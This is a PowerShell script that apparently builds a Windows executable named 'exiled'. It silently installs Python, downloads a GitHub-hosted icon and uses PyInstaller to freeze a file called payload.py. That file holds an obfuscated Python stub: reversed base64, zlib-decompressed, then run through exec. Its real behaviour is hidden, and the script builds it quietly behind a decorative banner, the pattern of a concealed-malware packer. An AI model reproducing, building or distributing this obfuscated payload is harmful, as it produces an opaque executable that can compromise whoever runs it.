[CmdletBinding()]
param(
    [string]$Out = "exiled",
    [string]$Icon = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/halloween.png",
    [string]$Dir,
    [switch]$NoIcon,
    [switch]$KeepBuild
)

$ErrorActionPreference = "Stop"
$OutName = $Out
$UseIcon = -not $NoIcon

function Log {
    param([string]$Type, [string]$Text)
    $time = (Get-Date).ToString("HH:mm:ss")
    switch ($Type) {
        "error"   { Write-Host "[$time] [FAIL] $Text" -ForegroundColor Red }
        "warning" { Write-Host "[$time] [WARN] $Text" -ForegroundColor Yellow }
        "success" { Write-Host "[$time] [ OK ] $Text" -ForegroundColor Green }
        default   { Write-Host "[$time] [INFO] $Text" -ForegroundColor DarkGray }
    }
}

$Arch = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
$PythonExe = $null

foreach ($cand in @("python", "py", "python3")) {
    $cmd = Get-Command $cand -ErrorAction SilentlyContinue
    if ($cmd) { $PythonExe = $cmd.Source; break }
}

if (-not $PythonExe) {
    Log warning "Python not found on PATH. Initiating auto-install..."
    $pyVersion = "3.11.9"
    $pyArch = if ($Arch -eq "x64") { "amd64" } else { "win32" }
    $pyInstallerUrl = "https://www.python.org/ftp/python/$pyVersion/python-$pyVersion-$pyArch.exe"
    $pyInstallerPath = Join-Path $env:TEMP "python_installer.exe"
    
    Log info "Downloading Python $pyVersion ($pyArch)..."
    try {
        Invoke-WebRequest -Uri $pyInstallerUrl -OutFile $pyInstallerPath -UseBasicParsing
    } catch {
        Log error "Failed to download Python installer."
        exit 1
    }
    
    Log info "Installing Python silently..."
    Start-Process -FilePath $pyInstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0" -Wait
    
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    
    foreach ($cand in @("python", "py", "python3")) {
        $cmd = Get-Command $cand -ErrorAction SilentlyContinue
        if ($cmd) { $PythonExe = $cmd.Source; break }
    }
    
    if (-not $PythonExe) {
        Log error "Auto-install failed. Please install Python manually."
        exit 1
    }
    Log success "Python successfully installed."
}

$UseCurl = $null -ne (Get-Command curl.exe -ErrorAction SilentlyContinue)
if (-not $UseCurl) {
    $IWR = Get-Command Invoke-WebRequest -ErrorAction SilentlyContinue
    if (-not $IWR) {
        Log error "Neither curl.exe nor Invoke-WebRequest available."
        exit 1
    }
}

if ($Dir) {
    $Here = (Resolve-Path -LiteralPath $Dir).Path
} else {
    $Here = (Get-Location).Path
}
$Work     = Join-Path $Here "_build"
$Stub     = Join-Path $Work "payload.py"
$IconRaw  = Join-Path $Work "icon.raw"
$IconIco  = Join-Path $Work "icon.ico"
$DistDir  = Join-Path $Here "dist"

Write-Host ""
Write-Host "  ███████╗██╗  ██╗██╗██╗     ███████╗██████╗ " -ForegroundColor DarkYellow
Write-Host "  ██╔════╝╚██╗██╔╝██║██║     ██╔════╝██╔══██╗" -ForegroundColor DarkYellow
Write-Host "  █████╗   ╚███╔╝ ██║██║     █████╗  ██║  ██║" -ForegroundColor DarkYellow
Write-Host "  ██╔══╝   ██╔██╗ ██║██║     ██╔══╝  ██║  ██║" -ForegroundColor DarkYellow
Write-Host "  ███████╗██╔╝ ██╗██║███████╗███████╗██████╔╝" -ForegroundColor DarkYellow
Write-Host "  ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝ " -ForegroundColor DarkYellow
Write-Host ""
Log info "Building $OutName for windows-$Arch"
Log info "Output directory: $Here"

$ExePath = Join-Path $DistDir "$OutName.exe"
if (Test-Path -LiteralPath $ExePath) {
    Log info "Found existing $OutName.exe. Removing..."
    try {
        Remove-Item -LiteralPath $ExePath -Force
        Log success "Deleted old executable."
    } catch {
        Log error "Failed to delete existing EXE. Is it currently running?"
        exit 1
    }
}

New-Item -ItemType Directory -Force -Path $Work | Out-Null
New-Item -ItemType Directory -Force -Path $DistDir | Out-Null

$stubBody = @'

# Python obfuscation by pyobfuscator.com
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))

'@
Set-Content -Path $Stub -Value $stubBody -Encoding UTF8

if ($UseIcon) {
    if ($Icon -match '^https?://') {
        Log info "Fetching icon..."
        try {
            if ($UseCurl) {
                & curl.exe -fsSL -A "Mozilla/5.0" $Icon -o $IconRaw 2>$null
            } else {
                Invoke-WebRequest -Uri $Icon -Headers @{ "User-Agent" = "Mozilla/5.0" } -OutFile $IconRaw
            }
        } catch {
            Log warning "Failed to fetch icon, skipping."
            $UseIcon = $false
        }
    } else {
        if (-not (Test-Path -LiteralPath $Icon)) {
            Log warning "Icon file not found, skipping."
            $UseIcon = $false
        } else {
            Copy-Item -LiteralPath $Icon -Destination $IconRaw -Force
        }
    }
}

Log info "Installing build dependencies..."
$oldEAP = $ErrorActionPreference
$ErrorActionPreference = "Continue"
& $PythonExe -m pip install --quiet --upgrade pyinstaller pillow | Out-Null
$ErrorActionPreference = $oldEAP
if ($LASTEXITCODE -ne 0) {
    Log error "pip install failed."
    exit 1
}

if ($UseIcon) {
    Log info "Converting icon to .ico..."
    $conv = @'
from PIL import Image
try:
    img = Image.open(r'__ICON_RAW__')
    if img.mode != 'RGBA':
        img = img.convert('RGBA')
    img.save(r'__ICON_ICO__', format='ICO', sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)])
except Exception as e:
    print(f"Icon conversion failed: {e}")
    exit(1)
'@
    $conv = $conv -replace '__ICON_RAW__', $IconRaw -replace '__ICON_ICO__', $IconIco
    $convTmp = Join-Path $Work "_icon_conv.py"
    Set-Content -Path $convTmp -Value $conv -Encoding UTF8
    
    $ErrorActionPreference = "Continue"
    & $PythonExe $convTmp | Out-Null
    $ErrorActionPreference = $oldEAP
    
    if ($LASTEXITCODE -ne 0) {
        Log warning "Icon conversion failed, skipping."
        $UseIcon = $false
    }
}

Log info "Freezing executable (this may take a minute)..."

$pyiArgs = @(
    "-m", "PyInstaller",
    "--onefile",
    "--noconfirm",
    "--clean",
    "--hidden-import", "ctypes",
    "--hidden-import", "ctypes.wintypes",
    "--hidden-import", "tkinter",
    "--collect-all", "ctypes",
    "--collect-all", "tkinter",
    "--name", $OutName,
    "--distpath", $DistDir,
    "--workpath", (Join-Path $Work "pyi"),
    "--specpath", $Work
)
if ($UseIcon -and (Test-Path $IconIco)) {
    $pyiArgs += @("--icon", $IconIco)
}
$pyiArgs += $Stub

$argString = $pyiArgs -join " "
$ErrorActionPreference = "Continue"
cmd.exe /c "`"$PythonExe`" $argString >nul 2>&1"
$pyiExit = $LASTEXITCODE
$ErrorActionPreference = $oldEAP

if ($pyiExit -ne 0) {
    Log error "PyInstaller failed."
    exit 1
}

if (-not $KeepBuild) {
    Remove-Item -Recurse -Force $Work -ErrorAction SilentlyContinue
}

Write-Host ""
Write-Host "  ┌──────────────────────────────────────────────┐" -ForegroundColor DarkGray
Write-Host "  │  Build Complete!                             │" -ForegroundColor DarkGray
Write-Host "  └──────────────────────────────────────────────┘" -ForegroundColor DarkGray
Log success "Executable compiled successfully."
Log info "Output: $ExePath"
Log info "Target Architecture: Windows $Arch"
Log info "Run command: & `"$ExePath`""
Write-Host ""
